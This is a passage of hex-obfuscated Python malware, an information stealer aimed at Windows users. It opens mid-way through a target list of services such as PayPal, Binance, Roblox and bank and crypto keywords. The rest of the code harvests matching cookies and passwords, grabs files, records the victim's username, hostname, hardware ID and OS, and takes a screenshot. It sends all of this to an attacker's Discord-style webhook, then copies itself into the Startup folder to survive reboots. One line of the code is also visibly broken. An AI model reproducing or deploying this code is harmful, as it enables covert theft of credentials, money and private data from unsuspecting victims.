    "\x5b\x79\x6f\x75\x74\x75\x62\x65\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x29",
    "\x5b\x69\x6e\x73\x74\x61\x67\x72\x61\x6d\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x6e\x73\x74\x61\x67\x72\x61\x6d\x2e\x63\x6f\x6d\x29",
    "\x5b\x74\x69\x6b\x74\x6f\x6b\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x69\x6b\x74\x6f\x6b\x2e\x63\x6f\x6d\x29",
    "\x5b\x74\x77\x69\x74\x74\x65\x72\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x77\x69\x74\x74\x65\x72\x2e\x63\x6f\x6d\x29",
    "\x5b\x66\x61\x63\x65\x62\x6f\x6f\x6b\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x29",
    "\x63\x61\x72\x64",
    "\x5b\x65\x70\x69\x63\x67\x61\x6d\x65\x73\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x70\x69\x63\x67\x61\x6d\x65\x73\x2e\x63\x6f\x6d\x29",
    "\x5b\x73\x70\x6f\x74\x69\x66\x79\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x70\x6f\x74\x69\x66\x79\x2e\x63\x6f\x6d\x29",
    "\x5b\x79\x61\x68\x6f\x6f\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x79\x61\x68\x6f\x6f\x2e\x63\x6f\x6d\x29",
    "\x5b\x72\x6f\x62\x6c\x6f\x78\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x6f\x62\x6c\x6f\x78\x2e\x63\x6f\x6d\x29",
    "\x5b\x74\x77\x69\x74\x63\x68\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x77\x69\x74\x63\x68\x2e\x63\x6f\x6d\x29",
    "\x5b\x6d\x69\x6e\x65\x63\x72\x61\x66\x74\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x69\x6e\x65\x63\x72\x61\x66\x74\x2e\x6e\x65\x74\x29",
    "\x62\x61\x6e\x6b",
    "\x5b\x70\x61\x79\x70\x61\x6c\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x61\x79\x70\x61\x6c\x2e\x63\x6f\x6d\x29",
    "\x5b\x6f\x72\x69\x67\x69\x6e\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x72\x69\x67\x69\x6e\x2e\x63\x6f\x6d\x29",
    "\x5b\x61\x6d\x61\x7a\x6f\x6e\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x6d\x61\x7a\x6f\x6e\x2e\x63\x6f\x6d\x29",
    "\x5b\x65\x62\x61\x79\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x62\x61\x79\x2e\x63\x6f\x6d\x29",
    "\x5b\x61\x6c\x69\x65\x78\x70\x72\x65\x73\x73\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x6c\x69\x65\x78\x70\x72\x65\x73\x73\x2e\x63\x6f\x6d\x29",
    "\x5b\x70\x6c\x61\x79\x73\x74\x61\x74\x69\x6f\x6e\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x6c\x61\x79\x73\x74\x61\x74\x69\x6f\x6e\x2e\x63\x6f\x6d\x29",
    "\x5b\x68\x62\x6f\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x68\x62\x6f\x2e\x63\x6f\x6d\x29",
    "\x5b\x78\x62\x6f\x78\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x78\x62\x6f\x78\x2e\x63\x6f\x6d\x29",
    "\x62\x75\x79",
    "\x73\x65\x6c\x6c",
    "\x5b\x62\x69\x6e\x61\x6e\x63\x65\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x62\x69\x6e\x61\x6e\x63\x65\x2e\x63\x6f\x6d\x29",
    "\x5b\x68\x6f\x74\x6d\x61\x69\x6c\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x68\x6f\x74\x6d\x61\x69\x6c\x2e\x63\x6f\x6d\x29",
    "\x5b\x6f\x75\x74\x6c\x6f\x6f\x6b\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x75\x74\x6c\x6f\x6f\x6b\x2e\x63\x6f\x6d\x29",
    "\x5b\x63\x72\x75\x6e\x63\x68\x79\x72\x6f\x6c\x6c\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x72\x75\x6e\x63\x68\x79\x72\x6f\x6c\x6c\x2e\x63\x6f\x6d\x29",
    "\x5b\x74\x65\x6c\x65\x67\x72\x61\x6d\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x63\x6f\x6d\x29",
    "\x5b\x70\x6f\x72\x6e\x68\x75\x62\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x6f\x72\x6e\x68\x75\x62\x2e\x63\x6f\x6d\x29",
    "\x5b\x64\x69\x73\x6e\x65\x79\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x6e\x65\x79\x2e\x63\x6f\x6d\x29",
    "\x5b\x65\x78\x70\x72\x65\x73\x73\x76\x70\x6e\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x78\x70\x72\x65\x73\x73\x76\x70\x6e\x2e\x63\x6f\x6d\x29",
    "\x63\x72\x79\x70\x74\x6f",
    "\x5b\x75\x62\x65\x72\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x62\x65\x72\x2e\x63\x6f\x6d\x29",
    "\x5b\x6e\x65\x74\x66\x6c\x69\x78\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x74\x66\x6c\x69\x78\x2e\x63\x6f\x6d\x29",
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = []
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith:
        thread.join()

    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a), 1]
                b = ffil[1]
                filetext += f"└─\x3a\x6f\x70\x65\x6e\x5f\x66\x69\x6c\x65\x5f\x66\x6f\x6c\x64\x65\x72\x3a [{fileanme}]({b})\n"
            filetext += "\n"
    upload("\x6b\x69\x77\x69", filetext)

username = getpass.getuser()

hostname = socket.gethostname()

hwid = (str(subprocess.check_output("\x77\x6d\x69\x63\x20\x63\x73\x70\x72\x6f\x64\x75\x63\x74\x20\x67\x65\x74\x20\x75\x75\x69\x64"),
            "\x75\x74\x66\x2d\x38").split("\n")[1].strip())

name = (str(subprocess.check_output("\x77\x6d\x69\x63\x20\x63\x73\x70\x72\x6f\x64\x75\x63\x74\x20\x67\x65\x74\x20\x6e\x61\x6d\x65"),
            "\x75\x74\x66\x2d\x38").split("\n")[1].strip())

embed = {
    "\x74\x69\x74\x6c\x65":
    "معلومات جهاز الضحيه",
    "\x63\x6f\x6c\x6f\x72":
    0,
    "\x66\x69\x65\x6c\x64\x73": [
        {
            "\x6e\x61\x6d\x65": "الاسم",
            "\x76\x61\x6c\x75\x65": f"```\x48\x6f\x73\x74\x20\x4e\x61\x6d\x65\x3a {hostname}\n\n\x55\x73\x65\x72\x6e\x61\x6d\x65\x3a {username}```",
            "\x69\x6e\x6c\x69\x6e\x65": True,
        },
        {
            "\x6e\x61\x6d\x65": "النظام",
            "\x76\x61\x6c\x75\x65":
            f"```\x4f\x53\x3a {platform.platform()}\n\n\x50\x72\x6f\x63\x65\x73\x73\x6f\x72\x3a {platform.processor()}\n\n\x48\x57\x49\x44: {hwid}```",
            "\x69\x6e\x6c\x69\x6e\x65": True,
        },
    ],
}

requests.post(whook, json={"\x65\x6d\x62\x65\x64\x73": [embed]})

screenshot = ImageGrab.grab()
screenshot.save("\x73\x63\x72\x65\x65\x6e\x73\x68\x6f\x74\x2e\x70\x6e\x67")
files = {"\x73\x63\x72\x65\x65\x6e\x73\x68\x6f\x74": open("\x73\x63\x72\x65\x65\x6e\x73\x68\x6f\x74\x2e\x70\x6e\x67", "\x72\x62")}
requests.post(whook, files=files)
files["\x73\x63\x72\x65\x65\x6e\x73\x68\x6f\x74"].close()
os.remove("\x73\x63\x72\x65\x65\x6e\x73\x68\x6f\x74\x2e\x70\x6e\x67")

payload = {"\x63\x6f\x6e\x74\x65\x6e\x74": "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x67\x67\x2f\x6d\x73\x6e"}

response = requests.post(whook, json=payload)
home_dir = os.path.expanduser('~')

startup_folder = os.path.join(home_dir, '\x41\x70\x70\x44\x61\x74\x61', '\x52\x6f\x61\x6d\x69\x6e\x67', '\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74', '\x57\x69\x6e\x64\x6f\x77\x73', '\x53\x74\x61\x72\x74\x20\x4d\x65\x6e\x75', '\x50\x72\x6f\x67\x72\x61\x6d\x73', '\x53\x74\x61\x72\x74\x75\x70')

src_file_path = '\x43\x3a\x2f\x44\x65\x73\x6b\x74\x6f\x70\x2f\x6d\x61\x69\x6e\x2e\x70\x79'
dst_file_path = os.path.join(startup_folder, '\x6d\x61\x69\x6e\x2e\x70\x79')
shutil.copyfile(src_file_path, dst_file_path)